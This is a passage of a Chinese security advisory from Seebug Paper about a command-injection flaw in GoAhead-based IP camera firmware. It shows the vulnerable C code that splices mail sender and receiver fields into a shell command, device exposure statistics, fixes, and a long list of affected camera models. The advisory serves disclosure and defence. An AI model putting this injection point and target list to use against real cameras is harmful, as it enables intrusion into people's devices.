<span class="mi">350</span><span class="o">:</span>    <span class="k">if</span> <span class="p">(</span> <span class="n">pdst</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span>
<span class="mi">351</span><span class="o">:</span>    <span class="p">{</span>
<span class="mi">352</span><span class="o">:</span>        <span class="k">return</span> <span class="n">CGI_IESET_MAILTEST</span><span class="p">;</span>
<span class="mi">353</span><span class="o">:</span><span class="p">}</span>

<span class="mi">7674</span><span class="o">:</span>   <span class="k">case</span> <span class="nl">CGI_IESET_MAILTEST</span><span class="p">:</span>
<span class="mi">7675</span><span class="o">:</span>       <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="p">)</span>
<span class="mi">7676</span><span class="o">:</span>       <span class="p">{</span>
<span class="mi">7677</span><span class="o">:</span>           <span class="n">iRet</span> <span class="o">=</span> <span class="n">cgisetmailtest</span><span class="p">(</span> <span class="n">pbuf</span><span class="p">,</span> <span class="n">pparam</span><span class="p">,</span> <span class="n">byPri</span> <span class="p">);</span>
<span class="mi">7678</span><span class="o">:</span>       <span class="p">}</span>
<span class="mi">7679</span><span class="o">:</span>
<span class="mi">7680</span><span class="o">:</span>       <span class="k">break</span><span class="p">;</span>

<span class="mi">7746</span><span class="o">:</span>   <span class="k">case</span> <span class="nl">CGI_IESET_MAIL</span><span class="p">:</span>
<span class="mi">7747</span><span class="o">:</span>       <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="p">)</span>
<span class="mi">7748</span><span class="o">:</span>       <span class="p">{</span>
<span class="mi">7749</span><span class="o">:</span>           <span class="n">iRet</span> <span class="o">=</span> <span class="n">cgisetmail</span><span class="p">(</span> <span class="n">pbuf</span><span class="p">,</span> <span class="n">pparam</span><span class="p">,</span> <span class="n">byPri</span> <span class="p">);</span>
<span class="mi">7750</span><span class="o">:</span>           <span class="n">IETextout</span><span class="p">(</span> <span class="s">&quot;-------------OK--------&quot;</span> <span class="p">);</span>
<span class="mi">7751</span><span class="o">:</span>           <span class="n">NoteSaveSem</span><span class="p">();</span>
<span class="mi">7752</span><span class="o">:</span>       <span class="p">}</span>
<span class="mi">7753</span><span class="o">:</span>
<span class="mi">7754</span><span class="o">:</span>       <span class="k">break</span><span class="p">;</span>
</pre></div>


<p>跟上一个远程命令执行漏洞类似，<code>cgisetmail()</code>函数用于将各参数储存到结构体，例如<code>sender</code>参数赋值给<code>bparam.stMailParam.szSender</code>、<code>receiver1</code>参数赋值给<code>bparam.stMailParam.szReceiver1</code>。
接着，来到了<code>cgisetmailtest()</code>函数:</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">cgisetmailtest</span><span class="p">(</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">pbuf</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">pparam</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byPri</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">char</span>   <span class="n">temp</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
    <span class="kt">int</span>             <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span>             <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">char</span>            <span class="n">nexturl</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="kt">int</span>     <span class="n">iRet</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span> <span class="n">temp</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">2048</span> <span class="p">);</span>

    <span class="c1">//iRet = DoMailTest();</span>
    <span class="k">if</span><span class="p">(</span><span class="n">iRet</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">IETextout</span><span class="p">(</span><span class="s">&quot;Mail send over, OK or Not&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="cm">/* END:   Added by Baggio.wu, 2013/10/25 */</span>

    <span class="n">memset</span><span class="p">(</span> <span class="n">nexturl</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">64</span> <span class="p">);</span>
    <span class="n">iRet</span> <span class="o">=</span> <span class="n">GetStrParamValue</span><span class="p">(</span> <span class="n">pparam</span><span class="p">,</span> <span class="s">&quot;next_url&quot;</span><span class="p">,</span> <span class="n">nexturl</span><span class="p">,</span> <span class="mi">63</span> <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">iRet</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="p">)</span>
    <span class="p">{</span>
<span class="cp">#if 1</span>
        <span class="n">len</span> <span class="o">+=</span> <span class="n">RefreshUrl</span><span class="p">(</span> <span class="n">temp</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="n">nexturl</span> <span class="p">);</span>
<span class="cp">#endif</span>
        <span class="n">memcpy</span><span class="p">(</span> <span class="n">pbuf</span><span class="p">,</span> <span class="n">temp</span><span class="p">,</span> <span class="n">len</span> <span class="p">);</span>
    <span class="p">}</span>

    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">len</span> <span class="o">+=</span> <span class="n">sprintf</span><span class="p">(</span> <span class="n">temp</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="s">&quot;var result=</span><span class="se">\&quot;</span><span class="s">ok</span><span class="se">\&quot;</span><span class="s">;</span><span class="se">\r\n</span><span class="s">&quot;</span> <span class="p">);</span>
        <span class="n">memcpy</span><span class="p">(</span> <span class="n">pbuf</span><span class="p">,</span> <span class="n">temp</span><span class="p">,</span> <span class="n">len</span> <span class="p">);</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span> <span class="s">&quot;sendmail len:%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">len</span> <span class="p">);</span>
    <span class="k">return</span> <span class="n">len</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>该函数第十行已被注释掉。这是使用此函数发送邮件证据的唯一可寻之处。虽然被注释掉了，我们也要继续跟踪<code>DoMailTest()</code>这个函数：</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">DoMailTest</span><span class="p">(</span> <span class="kt">void</span> <span class="p">)</span>  <span class="c1">//email test</span>
<span class="p">{</span>
    <span class="kt">int</span>     <span class="n">iRet</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="kt">char</span>    <span class="n">cmd</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stMailParam</span><span class="p">.</span><span class="n">szSender</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stMailParam</span><span class="p">.</span><span class="n">szReceiver1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0x00</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">iRet</span> <span class="o">=</span> <span class="n">EmailConfig</span><span class="p">();</span>

        <span class="k">if</span> <span class="p">(</span> <span class="n">iRet</span> <span class="p">)</span>
        <span class="p">{</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">memset</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">256</span> <span class="p">);</span>

        <span class="cm">/* BEGIN: Modified by Baggio.wu, 2013/9/9 */</span>
        <span class="n">sprintf</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;echo </span><span class="se">\&quot;</span><span class="s">mail test ok</span><span class="se">\&quot;</span><span class="s"> | /system/system/bin/mailx -r %s -s </span><span class="se">\&quot;</span><span class="s">mail test</span><span class="se">\&quot;</span><span class="s">  %s&quot;</span><span class="p">,</span>
                 <span class="n">bparam</span><span class="p">.</span><span class="n">stMailParam</span><span class="p">.</span><span class="n">szSender</span><span class="p">,</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stMailParam</span><span class="p">.</span><span class="n">szReceiver1</span> <span class="p">);</span>
        <span class="c1">//sprintf( cmd, &quot;echo \&quot;mail test ok\&quot; | /system/system/bin/mailx -v -s \&quot;mail test\&quot;  %s&quot;,</span>
        <span class="c1">//         bparam.stMailParam.szReceiver1 );</span>

        <span class="n">printf</span><span class="p">(</span> <span class="s">&quot;start cmd:%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">cmd</span> <span class="p">);</span>
        <span class="n">EmailWrite</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">)</span> <span class="p">);</span>
        <span class="c1">//emailtest();</span>
        <span class="n">printf</span><span class="p">(</span> <span class="s">&quot;cmd:%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">cmd</span> <span class="p">);</span>

    <span class="p">}</span>

    <span class="k">return</span> <span class="n">iRet</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>可以看到<code>sprintf( cmd, "echo \"mail test ok\" | /system/system/bin/mailx -r %s -s \"mail test\"  %s",bparam.stMailParam.szSender, bparam.stMailParam.szReceiver1 );</code>发件人和收件人都直接被拼接成命令导致最后的命令执行。</p>
<h2>三.漏洞影响范围</h2>
<p><code>ZoomEye网络空间探测引擎</code>探测结果显示，全球范围内共查询到<code>78</code>万条历史记录。我们根据这<code>78</code>万条结果再次进行探测，发现这些设备一共存在三种情况：  </p>
<ul>
<li>第一种是设备不存在漏洞。</li>
<li>
<p>第二种是设备存在验证绕过漏洞，但是由于<code>web</code>目录下没有<code>system.ini</code>，导致最终无法被利用。
<img alt="" src="https://images.seebug.org/content/images/2017/03/404.png-w331s" />
可以看到，当我们直接请求<code>system.ini</code>的时候，显示需要认证，但是当我们绕过验证之后，却显示<code>404 not found</code>。</p>
</li>
<li>
<p>最后一种是设备既存在验证绕过漏洞，又存在<code>system.ini</code>文件。这些设备就存在被入侵的风险。</p>
</li>
</ul>
<p>我们统计了最后一种设备的数量，数据显示有近<code>7万</code>的设备存在被入侵的风险。这7万设备的国家分布图如下:
<img alt="" src="https://images.seebug.org/content/images/2017/03/----.png" />
可以看出，美国、中国、韩国、法国、日本属于重灾区。我国一共有 7000 多台设备可能被入侵，其中近 6000 台位于香港。我们根据具体数据做成两张柱状图以便查看：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/03/---------.png" /></p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/03/-----------.png" />
（注：None为属于中国，但未解析出具体地址的IP）</p>
<p><strong>我们通过查询<code>ZoomEye网络空间探测引擎</code>历史记录，导出2016年1月1日，2017年1月1日和本报告编写时2017年3月14日三个时间点的数据进行分析。</strong></p>
<p>在这三个时间点，我们分别收录了<code>banner</code>中含有<code>GoAhead 5ccc069c403ebaf9f0171e9517f40e41</code>的设备26万台、65万台和78万台。
<img alt="" src="https://images.seebug.org/content/images/2017/03/-----1.png" /></p>
<p>但是这些ip中，存在漏洞的设备增长趋势却完全不同。
<img alt="" src="https://images.seebug.org/content/images/2017/03/-----2.png" /></p>
<p>可以看到，2016年1月1日已探明的设备中目前仅有2000多台存在漏洞，2017年1月1日之前探明的设备中有近3万台存在漏洞，仅仅两个多月后的今天，已有近7万台设备存在漏洞。</p>
<p>根据以上数据，我们可以做出如下判断：该漏洞出现时间大约是去年，直到今年被曝光之后才被大家所关注。在此期间，旧摄像头通过更新有漏洞固件的方式导致了该漏洞的出现，而那些新生产的摄像头则被销售到世界各地。根据今年新增的ip的地理位置，我们可以大致判断出这些存在漏洞的摄像头今年被销往何地。
<img alt="" src="https://images.seebug.org/content/images/2017/03/-----3.png" />
根据数据，我们可以看到，主要销售到了美国、中国、韩国、日本。中国新增了5316台存在漏洞的摄像头，其中4000多台位于香港。</p>
<h2>四.修复方案</h2>
<p>1.将存在漏洞的摄像头设备放置于内网。
2.及时升级到最新固件。
3.对于可能被感染的设备，可以采取重启的方式来杀死驻留在内存里的恶意进程。</p>
<h2>五.参考链接</h2>
<ol>
<li>https://www.seebug.org/vuldb/ssvid-92789</li>
<li>https://www.seebug.org/vuldb/ssvid-92748</li>
<li>https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html</li>
<li>https://github.com/kuangxingyiqing/bell-jpg</li>
<li>http://aluigi.altervista.org/adv/goahead-adv2.txt</li>
</ol>
<h2>附表1:Pierre Kim给出的受影响设备列表:</h2>
<table class="table table-striped-white table-bordered">
<thead>
<tr>
 <th>列表如下：</th>
</tr>
</thead>
<tbody><tr>
 <td>3G+IPCam Other</td>
</tr>
<tr>
 <td>3SVISION Other</td>
</tr>
<tr>
 <td>3com CASA</td>
</tr>
<tr>
 <td>3com Other</td>
</tr>
<tr>
 <td>3xLogic Other</td>
</tr>
<tr>
 <td>3xLogic Radio</td>
</tr>
<tr>
 <td>4UCAM Other</td>
</tr>
<tr>
 <td>4XEM Other</td>
</tr>
<tr>
 <td>555 Other</td>
</tr>
<tr>
 <td>7Links 3677</td>
</tr>
<tr>
 <td>7Links 3677-675</td>
</tr>
<tr>
 <td>7Links 3720-675</td>
</tr>
<tr>
 <td>7Links 3720-919</td>
</tr>
<tr>
 <td>7Links IP-Cam-in</td>
</tr>
<tr>
 <td>7Links IP-Wi-Fi</td>
</tr>
<tr>
 <td>7Links IPC-760HD</td>
</tr>
<tr>
 <td>7Links IPC-770HD</td>
</tr>
<tr>
 <td>7Links Incam</td>
</tr>
<tr>
 <td>7Links Other</td>
</tr>
<tr>
 <td>7Links PX-3615-675</td>
</tr>
<tr>
 <td>7Links PX-3671-675</td>
</tr>
<tr>
 <td>7Links PX-3720-675</td>
</tr>
<tr>
 <td>7Links PX3309</td>
</tr>
<tr>
 <td>7Links PX3615</td>
</tr>
<tr>
 <td>7Links ipc-720</td>
</tr>
<tr>
 <td>7Links px-3675</td>
</tr>
<tr>
 <td>7Links px-3719-675</td>
</tr>
<tr>
 <td>7Links px-3720-675</td>
</tr>
<tr>
 <td>A4Tech Other</td>
</tr>
<tr>
 <td>ABS Other</td>
</tr>
<tr>
 <td>ADT RC8021W</td>
</tr>
<tr>
 <td>AGUILERA AQUILERA</td>
</tr>
<tr>
 <td>AJT AJT-019129-BBCEF</td>
</tr>
<tr>
 <td>ALinking ALC</td>
</tr>
<tr>
 <td>ALinking Other</td>
</tr>
<tr>
 <td>ALinking dax</td>
</tr>
<tr>
 <td>AMC Other</td>
</tr>
<tr>
 <td>ANRAN ip180</td>
</tr>
<tr>
 <td>APKLINK Other</td>
</tr>
<tr>
 <td>AQUILA AV-IPE03</td>
</tr>
<tr>
 <td>AQUILA AV-IPE04</td>
</tr>
<tr>
 <td>AVACOM 5060</td>
</tr>
<tr>
 <td>AVACOM 5980</td>
</tr>
<tr>
 <td>AVACOM H5060W</td>
</tr>
<tr>
 <td>AVACOM NEW</td>
</tr>
<tr>
 <td>AVACOM Other</td>
</tr>
<tr>
 <td>AVACOM h5060w</td>
</tr>
<tr>
 <td>AVACOM h5080w</td>
</tr>
<tr>
 <td>Acromedia IN-010</td>
</tr>
<tr>
 <td>Acromedia Other</td>
</tr>
<tr>
 <td>Advance Other</td>
</tr>
<tr>
 <td>Advanced+home lc-1140</td>
</tr>
<tr>
 <td>Aeoss J6358</td>
</tr>
<tr>
 <td>Aetos 400w</td>
</tr>
<tr>
 <td>Agasio A500W</td>
</tr>
<tr>
 <td>Agasio A502W</td>
</tr>
<tr>
 <td>Agasio A512</td>
</tr>
<tr>
 <td>Agasio A533W</td>
</tr>
<tr>
 <td>Agasio A602W</td>
</tr>
<tr>
 <td>Agasio A603W</td>
</tr>
<tr>
 <td>Agasio Other</td>
</tr>
<tr>
 <td>AirLink Other</td>
</tr>
<tr>
 <td>Airmobi HSC321</td>
</tr>
<tr>
 <td>Airsight Other</td>
</tr>
<tr>
 <td>Airsight X10</td>
</tr>
<tr>
 <td>Airsight X34A</td>
</tr>
<tr>
 <td>Airsight X36A</td>
</tr>
<tr>
 <td>Airsight XC39A</td>
</tr>
<tr>
 <td>Airsight XX34A</td>
</tr>
<tr>
 <td>Airsight XX36A</td>
</tr>
<tr>
 <td>Airsight XX40A</td>
</tr>
<tr>
 <td>Airsight XX60A</td>
</tr>
<tr>
 <td>Airsight x10</td>
</tr>
<tr>
 <td>Airsight x10Airsight</td>
</tr>
<tr>
 <td>Airsight xc36a</td>
</tr>
<tr>
 <td>Airsight xc49a</td>
</tr>
<tr>
 <td>Airsight xx39A</td>
</tr>
<tr>
 <td>Airsight xx40a</td>
</tr>
<tr>
 <td>Airsight xx49a</td>
</tr>
<tr>
 <td>Airsight xx51A</td>
</tr>
<tr>
 <td>Airsight xx51a</td>
</tr>
<tr>
 <td>Airsight xx52a</td>
</tr>
<tr>
 <td>Airsight xx59a</td>
</tr>
<tr>
 <td>Airsight xx60a</td>
</tr>
<tr>
 <td>Akai AK7400</td>
</tr>
<tr>
 <td>Akai SP-T03WP</td>
</tr>
<tr>
 <td>Alecto 150</td>
</tr>
<tr>
 <td>Alecto Atheros</td>
</tr>
<tr>
 <td>Alecto DVC-125IP</td>
</tr>
<tr>
 <td>Alecto DVC-150-IP</td>
</tr>
<tr>
 <td>Alecto DVC-1601</td>
</tr>
<tr>
 <td>Alecto DVC-215IP</td>
</tr>
<tr>
 <td>Alecto DVC-255-IP</td>
</tr>
<tr>
 <td>Alecto dv150</td>
</tr>
<tr>
 <td>Alecto dvc-150ip</td>
</tr>
<tr>
 <td>Alfa 0002HD</td>
</tr>
<tr>
 <td>Alfa Other</td>
</tr>
<tr>
 <td>Allnet 2213</td>
</tr>
<tr>
 <td>Allnet ALL2212</td>
</tr>
<tr>
 <td>Allnet ALL2213</td>
</tr>
<tr>
 <td>Amovision Other</td>
</tr>
<tr>
 <td>Android+IP+cam IPwebcam</td>
</tr>
<tr>
 <td>Anjiel ip-sd-sh13d</td>
</tr>
<tr>
 <td>Apexis AH9063CW</td>
</tr>
<tr>
 <td>Apexis APM-H803-WS</td>
</tr>
<tr>
 <td>Apexis APM-H804-WS</td>
</tr>
<tr>
 <td>Apexis APM-J011</td>
</tr>
<tr>
 <td>Apexis APM-J011-Richard</td>
</tr>
<tr>
 <td>Apexis APM-J011-WS</td>
</tr>
<tr>
 <td>Apexis APM-J012</td>
</tr>
<tr>
 <td>Apexis APM-J012-WS</td>
</tr>
<tr>
 <td>Apexis APM-J0233</td>
</tr>
<tr>
 <td>Apexis APM-J8015-WS</td>
</tr>
<tr>
 <td>Apexis GENERIC</td>
</tr>
<tr>
 <td>Apexis H</td>
</tr>
<tr>
 <td>Apexis HD</td>
</tr>
<tr>
 <td>Apexis J</td>
</tr>
<tr>
 <td>Apexis Other</td>
</tr>
<tr>
 <td>Apexis PIPCAM8</td>
</tr>
<tr>
 <td>Apexis Pyle</td>
</tr>
<tr>
 <td>Apexis XF-IP49</td>
</tr>
<tr>
 <td>Apexis apexis</td>
</tr>
<tr>
 <td>Apexis apm-</td>
</tr>
<tr>
 <td>Apexis dealextreme</td>
</tr>
<tr>
 <td>Aquila+Vizion Other</td>
</tr>
<tr>
 <td>Area51 Other</td>
</tr>
<tr>
 <td>ArmorView Other</td>
</tr>
<tr>
 <td>Asagio A622W</td>
</tr>
<tr>
 <td>Asagio Other</td>
</tr>
<tr>
 <td>Asgari 720U</td>
</tr>
<tr>
 <td>Asgari Other</td>
</tr>
<tr>
 <td>Asgari PTG2</td>
</tr>
<tr>
 <td>Asgari UIR-G2</td>
</tr>
<tr>
 <td>Atheros ar9285</td>
</tr>
<tr>
 <td>AvantGarde SUMPPLE</td>
</tr>
<tr>
 <td>Axis 1054</td>
</tr>
<tr>
 <td>Axis 241S</td>
</tr>
<tr>
 <td>B-Qtech Other</td>
</tr>
<tr>
 <td>B-Series B-1</td>
</tr>
<tr>
 <td>BRAUN HD-560</td>
</tr>
<tr>
 <td>BRAUN HD505</td>
</tr>
<tr>
 <td>Beaulieu Other</td>
</tr>
<tr>
 <td>Bionics Other</td>
</tr>
<tr>
 <td>Bionics ROBOCAM</td>
</tr>
<tr>
 <td>Bionics Robocam</td>
</tr>
<tr>
 <td>Bionics T6892WP</td>
</tr>
<tr>
 <td>Bionics t6892wp</td>
</tr>
<tr>
 <td>Black+Label B2601</td>
</tr>
<tr>
 <td>Bravolink Other</td>
</tr>
<tr>
 <td>Breno Other</td>
</tr>
<tr>
 <td>CDR+king APM-J011-WS</td>
</tr>
<tr>
 <td>CDR+king Other</td>
</tr>
<tr>
 <td>CDR+king SEC-015-C</td>
</tr>
<tr>
 <td>CDR+king SEC-016-NE</td>
</tr>
<tr>
 <td>CDR+king SEC-028-NE</td>
</tr>
<tr>
 <td>CDR+king SEC-029-NE</td>
</tr>
<tr>
 <td>CDR+king SEC-039-NE</td>
</tr>
<tr>
 <td>CDR+king sec-016-ne</td>
</tr>
<tr>
 <td>CDXX Other</td>
</tr>
<tr>
 <td>CDXXcamera Any</td>
</tr>
<tr>
 <td>CP+PLUS CP-EPK-HC10L1</td>
</tr>
<tr>
 <td>CPTCAM Other</td>
</tr>
<tr>
 <td>Camscam JWEV-372869-BCBAB</td>
</tr>
<tr>
 <td>Casa Other</td>
</tr>
<tr>
 <td>Cengiz Other</td>
</tr>
<tr>
 <td>Chinavasion Gunnie</td>
</tr>
<tr>
 <td>Chinavasion H30</td>
</tr>
<tr>
 <td>Chinavasion IP611W</td>
</tr>
<tr>
 <td>Chinavasion Other</td>
</tr>
<tr>
 <td>Chinavasion ip609aw</td>
</tr>
<tr>
 <td>Chinavasion ip611w</td>
</tr>
<tr>
 <td>Cloud MV1</td>
</tr>
<tr>
 <td>Cloud Other</td>
</tr>
<tr>
 <td>CnM IP103</td>
</tr>
<tr>
 <td>CnM Other</td>
</tr>
<tr>
 <td>CnM sec-ip-cam</td>
</tr>
<tr>
 <td>Compro NC150/420/500</td>
</tr>
<tr>
 <td>Comtac CS2</td>
</tr>
<tr>
 <td>Comtac CS9267</td>
</tr>
<tr>
 <td>Conceptronic CIPCAM720PTIWL</td>
</tr>
<tr>
 <td>Conceptronic cipcamptiwl</td>
</tr>
<tr>
 <td>Cybernova Other</td>
</tr>
<tr>
 <td>Cybernova WIP604</td>
</tr>
<tr>
 <td>Cybernova WIP604MW</td>
</tr>
<tr>
 <td>D-Link DCS-910</td>
</tr>
<tr>
 <td>D-Link DCS-930L</td>
</tr>
<tr>
 <td>D-Link L-series</td>
</tr>
<tr>
 <td>D-Link Other</td>
</tr>
<tr>
 <td>DB+Power 003arfu</td>
</tr>
<tr>
 <td>DB+Power DBPOWER</td>
</tr>
<tr>
 <td>DB+Power ERIK</td>
</tr>
<tr>
 <td>DB+Power HC-WV06</td>
</tr>
<tr>
 <td>DB+Power HD011P</td>
</tr>
<tr>
 <td>DB+Power HD012P</td>
</tr>
<tr>
 <td>DB+Power HD015P</td>
</tr>
<tr>
 <td>DB+Power L-615W</td>
</tr>
<tr>
 <td>DB+Power LA040</td>
</tr>
<tr>
 <td>DB+Power Other</td>
</tr>
<tr>
 <td>DB+Power Other2</td>
</tr>
<tr>
 <td>DB+Power VA-033K</td>
</tr>
<tr>
 <td>DB+Power VA0038K</td>
</tr>
<tr>
 <td>DB+Power VA003K+</td>
</tr>
<tr>
 <td>DB+Power VA0044_M</td>
</tr>
<tr>
 <td>DB+Power VA033K</td>
</tr>
<tr>
 <td>DB+Power VA033K+</td>
</tr>
<tr>
 <td>DB+Power VA035K</td>
</tr>
<tr>
 <td>DB+Power VA036K</td>
</tr>
<tr>
 <td>DB+Power VA038</td>
</tr>
<tr>
 <td>DB+Power VA038k</td>
</tr>
<tr>
 <td>DB+Power VA039K</td>
</tr>
<tr>
 <td>DB+Power VA039K-Test</td>
</tr>
<tr>
 <td>DB+Power VA040</td>
</tr>
<tr>
 <td>DB+Power VA390k</td>
</tr>
<tr>
 <td>DB+Power b</td>
</tr>
<tr>
 <td>DB+Power b-series</td>
</tr>
<tr>
 <td>DB+Power extcams</td>
</tr>
<tr>
 <td>DB+Power eye</td>
</tr>
<tr>
 <td>DB+Power kiskFirstCam</td>
</tr>
<tr>
 <td>DB+Power va033k</td>
</tr>
<tr>
 <td>DB+Power va039k</td>
</tr>
<tr>
 <td>DB+Power wifi</td>
</tr>
<tr>
 <td>DBB IP607W</td>
</tr>
<tr>
 <td>DEVICECLIENTQ CNB</td>
</tr>
<tr>
 <td>DKSEG Other</td>
</tr>
<tr>
 <td>DNT CamDoo</td>
</tr>
<tr>
 <td>DVR DVR</td>
</tr>
<tr>
 <td>DVS-IP-CAM Other</td>
</tr>
<tr>
 <td>DVS-IP-CAM Outdoor/IR</td>
</tr>
<tr>
 <td>Dagro DAGRO-003368-JLWYX</td>
</tr>
<tr>
 <td>Dagro Other</td>
</tr>
<tr>
 <td>Dericam H216W</td>
</tr>
<tr>
 <td>Dericam H502W</td>
</tr>
<tr>
 <td>Dericam M01W</td>
</tr>
<tr>
 <td>Dericam M2/6/8</td>
</tr>
<tr>
 <td>Dericam M502W</td>
</tr>
<tr>
 <td>Dericam M601W</td>
</tr>
<tr>
 <td>Dericam M801W</td>
</tr>
<tr>
 <td>Dericam Other</td>
</tr>
<tr>
 <td>Digix Other</td>
</tr>
<tr>
 <td>Digoo BB-M2</td>
</tr>
<tr>
 <td>Digoo MM==BB-M2</td>
</tr>
<tr>
 <td>Digoo bb-m2</td>
</tr>
<tr>
 <td>Dinon 8673</td>
</tr>
<tr>
 <td>Dinon 8675</td>
</tr>
<tr>
 <td>Dinon SEGEV-105</td>
</tr>
<tr>
 <td>Dinon segev-103</td>
</tr>
<tr>
 <td>Dome Other</td>
</tr>
<tr>
 <td>Drilling+machines Other</td>
</tr>
<tr>
 <td>E-Lock 1000</td>
</tr>
<tr>
 <td>ENSIDIO IP102W</td>
</tr>
<tr>
 <td>EOpen Open730</td>
</tr>
</tbody></table>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/252/">https://paper.seebug.org/252/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/251/"><span aria-hidden="true">&larr;</span> CVE-2017-0037 IE11&amp;Edge Typ...</a>
    
    
      <a class="older-posts" href="/253/">CVE-2016-10190 FFmpeg Heap ... <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
        <footer class="post-footer">
          <figure class="author-image">
            <a class="img" href="/users/author/?nickname=%E7%9F%A5%E9%81%93%E5%88%9B%E5%AE%87404%E5%AE%9E%E9%AA%8C%E5%AE%A4"
               style="background-image: url(https://images.seebug.org/uploads/2017/09/2016.6.27404_logo-03.png)"><span
                class="hidden">'s Picture</span></a>
          </figure>

          <section class="author">
            <h4><a
                href="/users/author/?nickname=%E7%9F%A5%E9%81%93%E5%88%9B%E5%AE%87404%E5%AE%9E%E9%AA%8C%E5%AE%A4">知道创宇404实验室</a>
            </h4>
            <p>阅读更多有关<a
                href="/users/author/?nickname=%E7%9F%A5%E9%81%93%E5%88%9B%E5%AE%87404%E5%AE%9E%E9%AA%8C%E5%AE%A4">该作者</a>的文章
            </p>
            
            <div class="author-meta">
            </div>
          </section>

          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          

        </footer>
      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
